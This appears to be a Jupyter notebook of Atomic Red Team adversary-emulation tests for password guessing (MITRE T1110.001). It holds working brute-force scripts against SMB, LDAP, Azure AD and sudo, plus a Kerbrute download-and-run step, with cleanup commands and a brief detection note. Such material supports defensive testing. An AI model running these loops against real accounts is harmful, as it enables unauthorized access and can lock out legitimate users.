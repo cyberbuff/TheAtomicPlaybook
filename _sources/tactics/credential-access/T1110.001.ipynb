{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cc5f1f9a",
   "metadata": {},
   "source": "# T1110.001 - Password Guessing\nAdversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
  },
  {
   "cell_type": "markdown",
   "id": "a271f130",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "641f2e08",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Brute Force Credentials of single Active Directory domain users via SMB",
    "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\necho Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%username%\" \"%p\" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\\IPC$ > NUL\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "232dc99b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "917f444c",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)",
    "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\n\n$passwordList = Get-Content -Path PathToAtomicsFolder\\T1110.001\\src\\passwords.txt\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"$ENV:USERNAME\", $password, \"$env:UserDnsDomain\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\n  try {\n    Write-Host \" [-] Attempting ${password} on account $ENV:USERNAME.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] $ENV:USERNAME:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "56610b15",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d465d3f6",
   "metadata": {},
   "source": "### Atomic Test #3 - Brute Force Credentials of single Azure AD user\nAttempt to brute force Azure AD user via AzureAD powershell module.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5fa7069d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c725407d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ad4ba24",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "f16019a6",
   "metadata": {},
   "source": "### Atomic Test #4 - SUDO brute force Debian\nAttempts to sudo with current user using passwords from a list.  Will run sudo 3 times, each with 3 different password attempts.\nPreRequisites : debian,ubuntu,kali and pam_tally NOT configured.\nIf the password list contains the user password in last 9 entries, a sudo will be attempted and will succeed if user is in /etc/sudoers.\nThe /var/log/auth.log will show evidence of \"3 incorrect password attempts\" or \"user NOT in sudoers\"\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if running on a Debian based machine.\n\n##### Check Prereq Commands:\n```sh\nif grep -iq \"debian\\|ubuntu\\|kali\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\ncp PathToAtomicsFolder/T1110.001/src/passwords.txt /tmp/workingfile\ncp PathToAtomicsFolder/T1110.001/src/asker.sh /tmp/asker && chmod 755 /tmp/asker\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo installed\"; else echo \"install sudo\"; fi\n\n```\n##### Get Prereq Commands:\n```sh\napt-get update && apt-get install -y sudo\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10cd3cfc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2cf6c166",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nfor i in 1 2 3 ; do SUDO_ASKPASS=/tmp/asker sudo -k -A whoami && wc -l /tmp/workingfile; done\necho done\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a2a5cc6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "09d83c3c",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/asker /tmp/workingfile\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c3f8a78",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "701fcf53",
   "metadata": {},
   "source": "### Atomic Test #5 - SUDO brute force Redhat\nBrute force the password of a local user account which is a member of the sudo'ers group on a Redhat based Linux distribution.  \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if running on a Redhat based machine.\n\n##### Check Prereq Commands:\n```sh\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"Redhat\"; else echo \"NOT Redhat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo installed\"; else echo \"install sudo\"; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl installed\"; else echo \"install openssl\"; fi\n\n```\n##### Get Prereq Commands:\n```sh\nyum -y update && yum install -y openssl sudo\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "458e68c3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fb60945e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nuseradd -G wheel -s /bin/bash -p $(openssl passwd -1 password) target\nsu target\n\nPASSWORDS=(one two three password five); \\\n    touch /tmp/file; \\\n    for P in ${PASSWORDS[@]}; do \\\n        date +\"%b %d %T\"; \\\n        sudo -k && echo \"$P\" |sudo -S whoami &>/tmp/file; \\\n        echo \"exit: $?\"; \\\n        if grep -q \"root\" /tmp/file; then \\\n            echo \"FOUND: sudo => $P\"; break; \\\n        else \\\n            echo \"TRIED: $P\"; \\\n        fi; \\\n        sleep 2; \\\n    done; \\\n    rm /tmp/file\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e009c75",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "8c8b9860",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nuserdel target\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3142325e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "877baf67",
   "metadata": {},
   "source": "### Atomic Test #6 - Password Brute User using Kerbrute Tool\nBruteforce a single user's password from a wordlist\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: kerbrute.exe must exist in $env:temp\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\kerbrute.exe){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"$env:temp\\kerbrute.exe\"\n\n```\n##### Description: bruteuser.txt must exist in $env:temp\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\bruteuser.txt){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true\" -outfile \"$env:temp\\bruteuser.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c279660",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c7cd3d2d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd $env:temp\n.\\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1 \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f299fd26",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "b4ce25b5",
   "metadata": {},
   "source": "## Detection\nMonitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}